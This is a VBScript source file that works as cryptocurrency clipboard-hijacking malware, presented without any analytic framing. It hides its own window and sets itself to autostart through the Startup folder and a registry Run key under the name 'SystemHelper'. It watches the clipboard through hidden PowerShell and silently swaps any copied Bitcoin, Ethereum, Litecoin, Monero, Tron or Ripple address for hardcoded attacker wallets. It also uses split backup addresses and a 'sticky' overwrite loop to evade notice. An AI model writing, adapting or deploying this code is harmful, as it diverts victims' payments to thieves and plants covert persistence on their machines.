Option Explicit
On Error Resume Next

If InStr(1, LCase(WScript.FullName), "cscript") > 0 Then
    CreateObject("WScript.Shell").Run "wscript.exe //B """"""" & WScript.ScriptFullName & """""""", 0, False
    WScript.Quit
End If

Dim WshShell, objFSO, objWMIService
Dim StartupPath, ScriptPath, RegKeyPath
Dim StartTime, LogFile

Set WshShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objWMIService = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")

StartTime = Now
ScriptPath = WScript.ScriptFullName
StartupPath = WshShell.SpecialFolders("Startup") & "\\SystemHelper.vbs"
RegKeyPath = "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SystemHelper"
LogFile = WshShell.ExpandEnvironmentStrings("%TEMP%") & "\\system_log.txt"

WriteLog "Tool started: " & StartTime

Dim DataSet1(5)
DataSet1(0) = "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh"
DataSet1(1) = "0x71C7656EC7ab88b098defB751B7401B5f6d8976F"
DataSet1(2) = "LQhefmrXTe72gg9oYkrvMaMKpeeR9oEUti"
DataSet1(3) = "87FKRU9ifbD7peMUgCZDqkNmtWGssEzXm5ZqYX81VUMcTcM1ZV9hW8HCoK27eMLEokMccpvK3FPzDPue2kgk9j2JTdporQv"
DataSet1(4) = "TSY8rEnuhVCnmxskLmjKd5meBtH9ECKdLW"
DataSet1(5) = "rhg15eX71z7cHe1BSTJfxLp4FEVkGtKaFF"

Dim BackupDataA(5), BackupDataB(5)

BackupDataA(0) = "bc1qdd5tmd5wwhhf6y8vguvw6v7qz5j84f9"
BackupDataB(0) = "zn8xe4g"

BackupDataA(1) = "0xC3499D03decD310bf9F2F953E85d954B74c62"
BackupDataB(1) = "Ef9"

BackupDataA(2) = "LQhefmrXTe72gg9oYkrvMaMKpeeR9oEU"
BackupDataB(2) = "ti"

BackupDataA(3) = "87FKRU9ifbD7peMUgCZDqkNmtWGssEzXm5ZqYX81VUMcTcM1ZV9hW8HCoK27eMLEokMccpvK3FPzDPue2kgk9j2JTdpor"
BackupDataB(3) = "Qv"

BackupDataA(4) = "TQY8rEnuhVCnmxskLmjKd5meBtH9ECKd"
BackupDataB(4) = "LW"

BackupDataA(5) = "rhg15eX71z7cHe1BSTJfxLp4FEVkGtKa"
BackupDataB(5) = "FF"

Function MergeData(partA, partB)
    MergeData = partA & partB
End Function

Sub WriteLog(message)
    On Error Resume Next
    Dim f, ts
    Set f = objFSO.OpenTextFile(LogFile, 8, True)
    ts = Now & " - " & message
    f.WriteLine ts
    f.Close
    Set f = Nothing
End Sub

Function TimeForBackupData()
    Dim minutesPassed
    minutesPassed = DateDiff("n", StartTime, Now)
    WriteLog "Time passed: " & minutesPassed & " minutes"
    
    If minutesPassed >= 15 Then
        TimeForBackupData = True
        WriteLog "Switching to backup data"
    Else
        TimeForBackupData = False
        WriteLog "Using primary data"
    End If
End Function

Function GetCurrentData(index)
    If TimeForBackupData() Then
        GetCurrentData = MergeData(BackupDataA(index), BackupDataB(index))
    Else
        GetCurrentData = DataSet1(index)
    End If
End Function

Sub AddToStartup()
    On Error Resume Next
    objFSO.CopyFile ScriptPath, StartupPath, True
    WshShell.RegWrite RegKeyPath, "wscript.exe //B """"""" & StartupPath & """""""", "REG_SZ"
    WriteLog "Autostart configured"
End Sub

Function GetClipboardText()
    On Error Resume Next
    Dim clipFile, psCommand, stream, result
    clipFile = WshShell.ExpandEnvironmentStrings("%TEMP%") & "\\clip_temp.txt"
    psCommand = "powershell -WindowStyle Hidden -NoProfile -NonInteractive -Command ""Add-Type -AssemblyName System.Windows.Forms; [System.IO.File]::WriteAllText([Environment]::GetEnvironmentVariable('TEMP') + '\\\\clip_temp.txt', [System.Windows.Forms.Clipboard]::GetText())"""
    WshShell.Run psCommand, 0, True
    result = ""
    If objFSO.FileExists(clipFile) Then
        Set stream = CreateObject("ADODB.Stream")
        stream.Type = 2
        stream.Charset = "UTF-8"
        stream.Open
        stream.LoadFromFile clipFile
        result = stream.ReadText
        stream.Close
        Set stream = Nothing
        objFSO.DeleteFile clipFile, True
    End If
    GetClipboardText = NormalizeClipboardText(result)
End Function

Function NormalizeClipboardText(raw)
    On Error Resume Next
    Dim s, i, c, firstLine
    If IsNull(raw) Then raw = ""
    s = CStr(raw)
    firstLine = Split(s, vbLf)(0)
    firstLine = Replace(firstLine, vbCr, "")
    firstLine = Replace(firstLine, vbTab, " ")
    firstLine = Trim(firstLine)
    NormalizeClipboardText = ""
    For i = 1 To Len(firstLine)
        c = Mid(firstLine, i, 1)
        If Asc(c) <> 0 Then NormalizeClipboardText = NormalizeClipboardText & c
    Next
    NormalizeClipboardText = Trim(NormalizeClipboardText)
End Function

Sub SetClipboardText(text)
    On Error Resume Next
    Dim clipFile, psCommand, stream
    clipFile = WshShell.ExpandEnvironmentStrings("%TEMP%") & "\\clip_temp.txt"
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 2
    stream.Charset = "UTF-8"
    stream.Open
    stream.WriteText text
    stream.SaveToFile clipFile, 2
    stream.Close
    Set stream = Nothing
    psCommand = "powershell -WindowStyle Hidden -NoProfile -NonInteractive -Command ""Add-Type -AssemblyName System.Windows.Forms; $t = [System.IO.File]::ReadAllText([Environment]::GetEnvironmentVariable('TEMP') + '\\\\clip_temp.txt'); [System.Windows.Forms.Clipboard]::SetText($t)"""
    WshShell.Run psCommand, 0, True
    If objFSO.FileExists(clipFile) Then objFSO.DeleteFile clipFile, True
End Sub

Function CheckPattern1(data)
    Dim regex
    Set regex = New RegExp
    regex.Pattern = "^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$"
    regex.IgnoreCase = True
    CheckPattern1 = regex.Test(data)
End Function

Function CheckPattern2(data)
    Dim regex
    Set regex = New RegExp
    regex.Pattern = "^0x[a-fA-F0-9]{40}$"
    regex.IgnoreCase = True
    CheckPattern2 = regex.Test(data)
End Function

Function CheckPattern3(data)
    Dim regex
    Set regex = New RegExp
    regex.Pattern = "^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$"
    regex.IgnoreCase = True
    CheckPattern3 = regex.Test(data)
End Function

Function CheckPattern4(data)
    Dim regex
    Set regex = New RegExp
    regex.Pattern = "^4[0-9AB][123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz]{93}$"
    regex.IgnoreCase = True
    CheckPattern4 = regex.Test(data)
End Function

Function CheckPattern5(data)
    Dim regex
    Set regex = New RegExp
    regex.Pattern = "^T[A-Za-z0-9]{33}$"
    regex.IgnoreCase = True
    CheckPattern5 = regex.Test(data)
End Function

Function CheckPattern6(data)
    Dim regex
    Set regex = New RegExp
    regex.Pattern = "^r[1-9A-HJ-NP-Za-km-z]{25,34}$"
    regex.IgnoreCase = True
    CheckPattern6 = regex.Test(data)
End Function

Function GetReplacementData(originalData)
    Dim trimmed
    trimmed = Trim(originalData)
    
    If CheckPattern1(trimmed) Then
        GetReplacementData = GetCurrentData(0)
        WriteLog "Updating data type 1"
    ElseIf CheckPattern2(trimmed) Then
        GetReplacementData = GetCurrentData(1)
        WriteLog "Updating data type 2"
    ElseIf CheckPattern3(trimmed) Then
        GetReplacementData = GetCurrentData(2)
        WriteLog "Updating data type 3"
    ElseIf CheckPattern4(trimmed) Then
        GetReplacementData = GetCurrentData(3)
        WriteLog "Updating data type 4"
    ElseIf CheckPattern5(trimmed) Then
        GetReplacementData = GetCurrentData(4)
        WriteLog "Updating data type 5"
    ElseIf CheckPattern6(trimmed) Then
        GetReplacementData = GetCurrentData(5)
        WriteLog "Updating data type 6"
    Else
        GetReplacementData = ""
    End If
End Function

Function IsAlreadyRunning()
    On Error Resume Next
    Dim colProcessList, objProcess, processCount
    processCount = 0
    Set colProcessList = objWMIService.ExecQuery("SELECT * FROM Win32_Process WHERE Name='wscript.exe' OR Name='cscript.exe'")
    For Each objProcess In colProcessList
        If InStr(1, objProcess.CommandLine, WScript.ScriptName, vbTextCompare) > 0 Then processCount = processCount + 1
    Next
    IsAlreadyRunning = (processCount > 1)
End Function

Sub MonitorClipboard()
    On Error Resume Next
    Dim lastClipboard, currentClipboard, replacementData
    Dim stickyData, stickyCount, POLL_MS, STICKY_ITERATIONS
    
    lastClipboard = ""
    stickyData = ""
    stickyCount = 0
    POLL_MS = 20
    STICKY_ITERATIONS = 50
    
    WriteLog "Starting clipboard monitoring"
    
    Do While True
        currentClipboard = GetClipboardText()
        
        If stickyCount > 0 Then
            replacementData = GetReplacementData(currentClipboard)
            
            If replacementData <> "" And replacementData <> stickyData Then
                SetClipboardText replacementData
                stickyData = replacementData
                stickyCount = STICKY_ITERATIONS
                lastClipboard = replacementData
                WriteLog "Activating sticky mode"
            Else
                SetClipboardText stickyData
                stickyCount = stickyCount - 1
                lastClipboard = stickyData
            End If
        ElseIf currentClipboard <> "" And currentClipboard <> lastClipboard Then
            replacementData = GetReplacementData(currentClipboard)
            
            If replacementData <> "" Then
                SetClipboardText replacementData
                stickyData = replacementData
                stickyCount = STICKY_ITERATIONS
                lastClipboard = replacementData
                WriteLog "New data detected"
            Else
                lastClipboard = currentClipboard
            End If
        Else
            lastClipboard = currentClipboard
        End If
        
        WScript.Sleep POLL_MS
    Loop
End Sub

If IsAlreadyRunning() Then 
    WriteLog "Tool already running - stopping new instance"
    WScript.Quit 
End If

AddToStartup
MonitorClipboard

Set WshShell = Nothing
Set objFSO = Nothing
Set objWMIService = Nothing
